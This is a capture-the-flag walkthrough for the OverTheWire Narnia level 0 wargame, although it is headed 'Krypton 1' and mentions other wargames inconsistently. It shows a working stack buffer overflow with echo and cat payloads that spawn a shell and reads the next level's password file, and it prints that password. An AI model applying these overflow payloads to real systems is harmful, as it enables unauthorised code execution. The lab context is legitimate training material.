# Krypton 1


## Overview

-----------------
On the OverTheWire/Leviathan website, we are told how connecting to the bandit server as a specific user works.

Each user corresponds to a different level:
- Krypton0 -> Level 0
- Krypton1 -> Level 1
- ...
- Krypton33 -> Level 33

Each level is hiding a flag, which is used as the password for the following level. Meaning, one must solve `Level n` to play `Level n+1`.

We always start out connecting to the `krypton.labs.overthewire.org` server on `port 2231` for each level.
Again, the users on the server specifies the level. Each starting point is the same:

``` text
➜  ~  ssh narnia0@narnia.labs.overthewire.org -p 2226
                                                _       
                         _ __   __ _ _ __ _ __ (_) __ _ 
                        | '_ \ / _` | '__| '_ \| |/ _` |
                        | | | | (_| | |  | | | | | (_| |
                        |_| |_|\__,_|_|  |_| |_|_|\__,_|
                                                        

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

narnia0@narnia.labs.overthewire.org's password: 
```

The password will always be the flag of the previous level. With the exception of Level 0, where the password is `narnia0`.


## Connecting

--------------

We can establish a connection with the server via ssh, and using the password `narnia0`:

``` text
➜  ~  ssh narnia0@narnia.labs.overthewire.org -p 2226
                                                _       
                         _ __   __ _ _ __ _ __ (_) __ _ 
                        | '_ \ / _` | '__| '_ \| |/ _` |
                        | | | | (_| | |  | | | | | (_| |
                        |_| |_|\__,_|_|  |_| |_|_|\__,_|
                                                        

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

narnia0@narnia.labs.overthewire.org's password: narnia0

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

<snip>

  Enjoy your stay!

narnia0@gibson:~$ 
```

## Looking Around

--------------
We first start by looking around the home directory, as we have no idea what is going on. We will use the command `ls`,
which allows us to `list` the content of the current directory (or specified directory).


``` text
narnia0@gibson:~$
narnia0@gibson:~$ cd /narnia
narnia0@gibson:/narnia$ ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
narnia0@gibson:/narnia$ cat narnia0.c
<snip>
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

Alright. We are dealing with a buffer overflow attack here. 

We are loading up the Stack as a "first in first out" type loading. Meaning:


| Stack                |
|----------------------|
|  char buf[20];       |
| long val=0x41414141; |

This means, if we go past the 19 character (as C has a `\x00` to signal end of array) we are overwriting the value of
the `long val=0x41414141;`.

``` text
narnia0@gibson:/narnia$ echo -en "aaaaaaaaaaaaaaaaaaaa" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaa
val: 0x41414100
WAY OFF!!!!
```
Notice how the value of `val` has changed, as we have pushed `20 a's` into the stack, causing the buffer to overflow. 

We can now add hex to the `"aaaa..."` string to push those into the value of `val`. 

#### Note

The first thing to clarify is that endianness is a hardware attribute, not a software/OS attribute, 
so WinXP and Linux are not big-endian or little endian, but rather the hardware on which they run is 
either big-endian or little endian.

-----------------------------

Therefore, we must test whether the hardware is using little endian or big endian for their hex notation. 

Let's check by just writing `\xde\xad\xbe\xef` at the end of the `aaaa...`:

``` text
narnia0@gibson:/narnia$ echo -en "aaaaaaaaaaaaaaaaaaaa\xde\xad\xbe\xef" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaޭ??
val: 0xefbeadde
WAY OFF!!!!
```

As we can see, the `\xde\xad\xbe\xef` was mirrored, therefore, to mirror it back, we can just use the `val: 0xefbeadde`
line of the previous output and just add the `\x` to the chars.

``` text
narnia0@gibson:/narnia$ echo -en "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ?
val: 0xdeadbeef
```

Boom We got the correct value, but nothing happened. This is because when we pipe an input into the program, the program
reads from the `stdin`, but doesn't attach a terminal in the process. (Which makes sense because we are running the program "isolated"
and just giving it the `stdout` from the `echo` command as the `stdin`.) Therefore, the `system("/bin/sh")` line gets called,
but because there is no terminal attached to the process, `system("/bin/sh")` doesn't do anything.

> When we pipe input into a program, the program does read from `stdin`, but it's a **non-interactive** `stdin`.

Well this is a bummer. How do we fight this? 

We can try to use `cat`, as `cat` by itself simply echoes whatever is passed to it. Example:

``` text
narnia0@gibson:/narnia$ cat
hello
hello
narnia
narnia
exit()
exit()
exit
exit
^C
narnia0@gibson:/narnia$ 
```

This means, we can create an artificial *terminal* by passing `cat` as a new command. [Magic Cat](../extras/magic_cat.md)

``` text
narnia0@gibson:/narnia$ ( echo -en "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde"; cat ) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ?
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
eaa6AjYMBB
exit
^C  
narnia0@gibson:/narnia$ 
```

BOOM we got a shell AND the flag.

